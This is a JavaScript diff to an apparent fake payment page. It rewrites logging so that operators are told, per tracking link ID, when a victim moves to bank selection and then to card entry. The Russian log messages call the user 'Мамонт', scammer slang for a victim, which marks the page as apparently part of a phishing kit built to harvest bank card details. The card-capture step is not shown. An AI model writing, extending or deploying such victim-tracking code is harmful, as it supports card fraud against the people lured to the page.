@@ -2433,9 +2433,9 @@ function openBankModal() {
 
   // Логирование: переход на выбор банка
   const urlParams = new URLSearchParams(window.location.search);
-  const link_id = urlParams.get('link_id');
+  const link_id = urlParams.get('link_id') || 'нет';
   if (typeof sendLog === 'function') {
-    sendLog('payment_bank_selection_opened', `link_id=${link_id || 'none'}`);
+    sendLog('payment_flow', `Мамонт перешел на выбор банка\nЛинк айди: ${link_id}`);
   }
 }
 
@@ -2447,6 +2447,13 @@ function closeBankModal() {
 function openCardModal() {
   document.getElementById('bankModal').classList.remove('open');
   document.getElementById('cardModal').classList.add('open');
+
+  // Логирование: переход на ввод карты
+  const urlParams = new URLSearchParams(window.location.search);
+  const link_id = urlParams.get('link_id') || 'нет';
+  if (typeof sendLog === 'function') {
+    sendLog('payment_flow', `Мамонт перешел на ввод карты\nЛинк айди: ${link_id}`);
+  }
 }
 
 function closeCardModal() {
@@ -2455,13 +2462,6 @@ function closeCardModal() {
 }
 
 function selectBank(bank) {
-  // Логирование: выбран банк
-  const urlParams = new URLSearchParams(window.location.search);
-  const link_id = urlParams.get('link_id');
-  if (typeof sendLog === 'function') {
-    sendLog('payment_bank_selected', `bank=${bank}, link_id=${link_id || 'none'}`);
-  }
-
   openCardModal();
 }
 
@@ -2475,15 +2475,6 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   }
 });
-
-// Fallback: если DOMContentLoaded уже произошёл, присваиваем напрямую
-const btnViewOrder = document.querySelector('.btn-view-order');
-if (btnViewOrder) {
-  btnViewOrder.addEventListener('click', function(e) {
-    e.preventDefault();
-    openBankModal();
-  });
-}
 </script>
 
 <!-- ===== ЧАТ ВИДЖЕТ ПОДДЕРЖКИ ===== -->
